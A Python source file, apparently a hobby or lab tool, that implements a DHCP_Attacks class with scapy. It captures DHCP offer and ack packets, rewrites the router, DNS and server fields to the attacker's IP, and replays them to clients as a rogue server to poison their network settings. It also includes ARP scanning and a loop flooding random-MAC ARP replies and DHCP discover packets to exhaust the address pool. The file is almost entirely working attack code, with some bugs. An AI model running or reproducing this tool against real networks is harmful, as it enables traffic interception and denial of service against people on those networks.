import random
from datetime import datetime,timedelta
import subprocess 
from pysnmp.hlapi import *
import scapy.all as scapy
from scapy.layers import dhcp,l2
from threading import Thread
import ipcalc


class DHCP_Attacks:
    scapy.conf.checkIPaddr = False
    def __init__(self,gateway,network,interface): 
        self.network = "1.1.1.0/24"
        self.router = "1.1.1.1"
        self.interface = "Ethernet 3"
        
        self.my_ip = None
        self.my_mac = None
        self.target_IP = ""
        self.stolen_offer_packet = None
        self.stolen_ack_packet = None
        self.avaliable_IPs = []
        self.used_IPs = []
        self.ip_to_give = self._assign_random_IP()



    def _sniff_dhcp(self,packet):

        #Target mac eksik (Client ID) 
        if (packet.haslayer(dhcp.DHCP)):
            if "DHCP Offer" in str(packet):
                               
                if self.stolen_offer_packet == None:
                    print("Sent the packet and captured the offer packet")

                    dhcp.dhcp_request(req_type="request",requested_addr=packet[dhcp.BOOTP].yiaddr,timeout=0)
                    self.my_ip = packet[dhcp.BOOTP].yiaddr

                    self.stolen_offer_packet = packet
                    self.stolen_offer_packet[dhcp.IP].src = self.my_ip
                    self.stolen_offer_packet[dhcp.Ether].src = self.my_mac

                    #Options
                    for i in range(0,len(packet[dhcp.DHCP].options)):
                         if type(packet[dhcp.DHCP].options[i]) == tuple:
                           
                            if packet[dhcp.DHCP].options[i][0] == 'router':
                                self.stolen_offer_packet[dhcp.DHCP].options[i] = ('router',self.my_ip)  #Benim IP'm ile router IP'ini değiştir
                                
                            if packet[dhcp.DHCP].options[i][0] == 'server_id':
                                self.stolen_offer_packet[dhcp.DHCP].options[i] = ('server_id',self.my_ip)

                            if packet[dhcp.DHCP].options[i][0] == 'name_server':
                                self.stolen_offer_packet[dhcp.DHCP].options[i] = ('name_server',self.my_ip)

                            if packet[dhcp.DHCP].options[i][0] == 'client_id':
                                self.stolen_offer_packet[dhcp.DHCP].options[i] = ('client_id',packet[dhcp.Ether].src) #Normalde target mac
                    print("Stole The Offer Packet Successfully")
      
                                            

        if (packet.haslayer(dhcp.DHCP)):
             if "DHCP Ack" in str(packet):
                 if self.stolen_ack_packet == None:
                    print("Stolen the ack packet successfully")
                    self.stolen_ack_packet  = packet
                    for i in range(0,len(packet[dhcp.DHCP].options)):
                         if type(packet[dhcp.DHCP].options[i]) == tuple:
        
                            if packet[dhcp.DHCP].options[i][0] == 'router':
                                        self.stolen_ack_packet[dhcp.DHCP].options[i] = ('router',self.my_ip)  #Benim IP'm ile router IP'ini değiştir
                                        
                            if packet[dhcp.DHCP].options[i][0] == 'server_id':
                                        self.stolen_ack_packet[dhcp.DHCP].options[i] = ('server_id',self.my_ip)

                            if packet[dhcp.DHCP].options[i][0] == 'name_server':
                                        self.stolen_ack_packet[dhcp.DHCP].options[i] = ('name_server',self.my_ip)

                            if packet[dhcp.DHCP].options[i][0] == 'client_id':
                                        self.stolen_ack_packet[dhcp.DHCP].options[i] = ('client_id',packet[dhcp.Ether].src) #Normalde target mac
                            
                            
        
        
        
        if (packet.haslayer(dhcp.DHCP)):    
            if "DHCP Discover" in str(packet):
                if self.stolen_offer_packet != None:
                    self.stolen_offer_packet[dhcp.BOOTP].xid = packet[dhcp.BOOTP].xid
                    self.stolen_offer_packet[dhcp.BOOTP].ciaddr = self.ip_to_give
                    self.stolen_offer_packet[dhcp.BOOTP].yiaddr = self.ip_to_give

                    self.stolen_offer_packet[dhcp.Ether].dst = packet[dhcp.Ether].src #if packet[dhcp.Ether].dst != "ff:ff:ff:ff:ff:ff" else "ff:ff:ff:ff:ff:ff"
                    self.stolen_offer_packet[dhcp.IP].dst = packet[dhcp.IP].src #if packet[dhcp.IP].dst != "255.255.255.255" else "255.255.255.255"
                    scapy.sendp(self.stolen_offer_packet,iface=self.interface)
                    #self.stolen_offer_packet[dhcp.IP].dst = packet[dhcp.IP].src if packet[dhcp.IP].dst != "255.255.255.255" else "255.255.255.255"
                    print("Sent the offer packet to" + str(packet[dhcp.Ether].src))
                    
            elif "DHCP Request" in str(packet):
                if self.stolen_ack_packet != None:
                    self.stolen_ack_packet[dhcp.BOOTP].xid = packet[dhcp.BOOTP].xid
                    self.stolen_ack_packet[dhcp.BOOTP].ciaddr = self.ip_to_give
                    self.stolen_ack_packet[dhcp.BOOTP].yiaddr = self.ip_to_give

                    self.stolen_ack_packet[dhcp.Ether].dst = packet[dhcp.Ether].src #if packet[dhcp.Ether].dst != "ff:ff:ff:ff:ff:ff" else "ff:ff:ff:ff:ff:ff"
                    self.stolen_ack_packet[dhcp.IP].dst = packet[dhcp.IP].src #if packet[dhcp.IP].dst != "255.255.255.255" else "255.255.255.255"
                    scapy.sendp(self.stolen_ack_packet,iface=self.interface)
                        #self.stolen_offer_packet[dhcp.IP].dst = packet[dhcp.IP].src if packet[dhcp.IP].dst != "255.255.255.255" else "255.255.255.255"
                    print("Sent the ack packet to " + str(packet[dhcp.Ether].src))
                    self.ip_to_give = self._assign_random_IP()
                    print("Poisoned this device: " + str(packet[dhcp.BOOTP].ciaddr))
                    
    def _scan_network(self):
            device_list = []
            try:
                subprocess.call('echo 1 > /proc/sys/net/ipv4/ip_forward')
            except:
                    print("Please enable IP routing if using Windows or Mac!")
                # Create arp packet object. pdst - destination host ip address
            arp_request = scapy.ARP(pdst=self.network)
                    # Create ether packet object. dst - broadcast mac address. 
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
                    # Combine two packets in two one
            arp_request_broadcast = broadcast/arp_request
                    # Get list with answered hosts
            answered_list,unanswered_list = scapy.srp(arp_request_broadcast,timeout=3,
                                            iface=self.interface)
            for i in range(1,len(answered_list)+1):
                if (answered_list[i-1][0].pdst == answered_list[i-1][0].psrc):
                    my_ip = answered_list[i-1][0].pdst
                device_list.append((answered_list[i-1][0].pdst,answered_list[i-1][1].hwsrc))
            for device_tuple in device_list:
                if device_tuple[0] == my_ip:
                        self.my_ip = my_ip
                        self.my_mac = device_tuple[1]
                        device_list.pop(device_list.index(device_tuple))      
            return device_list            
            
                
    def _send_packet(self):                
        dhcp.dhcp_request(req_type="discover",timeout=0, iface=self.interface)
   
    def _assign_random_IP(self): 
        for i in ipcalc.Network(self.network):
            if not i in self.avaliable_IPs:
                self.avaliable_IPs.append(i)
        chosen_ip = str(self.avaliable_IPs[random.randint(0,len(self.avaliable_IPs)-1)])
        self.avaliable_IPs.append(chosen_ip)
        self.avaliable_IPs.remove(chosen_ip)
        return chosen_ip 
            
    def dhcp_snoop(self):
        devices = self._scan_network()
        for i in devices: #(IP,MAC) tuple
            IP = i[0]
            self.used_IPs.append(IP)
        self.ip_to_give =self._assign_random_IP()
        self._send_packet()
        
        scapy.sniff(iface=self.interface,store=False,prn=self._sniff_dhcp)

    
    def discovery_dos(self,choice):
        scapy.conf.checkIPaddr = False
        print("Starting Now!")
        if choice == "1":
            count = 0
            random_list = ["0","1","2","3","4","5","6","7","8","9","A","B","C","D","E","F"]
            mac = ""
            
            #Create random MAC addresses
            while True:
                if len(mac) % 3 == 0 and len(mac) != 0:
                    mac += ":"    
                else:      
                    mac += random_list[random.randint(0,len(random_list)-1)]
                if len(mac) == 17:                
                    mac += mac[0]
                    mac = mac[1:]
                    packet = l2.ARP(op=2, pdst=self.router, hwsrc=mac,
                                psrc=self.interface)
                    scapy.send(packet,verbose=0,iface=self.interface)

            #Spam Discovery Packets
                    print(" Sent Packet As "+ mac,end="\r",flush=True)
                    print("Total Count: " + str(count),end="",flush=True)   
                    dhcp.dhcp_request(req_type="discover",hw=bytes(mac,'utf-8'),iface=self.interface,timeout=0,verbose=0)
                    count += 1
                    mac = ""  
        elif choice == "2":
            while True:
                print("T    otal Count: " + str(count),end="",flush=True)   
                dhcp.dhcp_request(req_type="discover",iface=self.interface,timeout=0,verbose=0)

        
        #Spam Discovery Packets
        
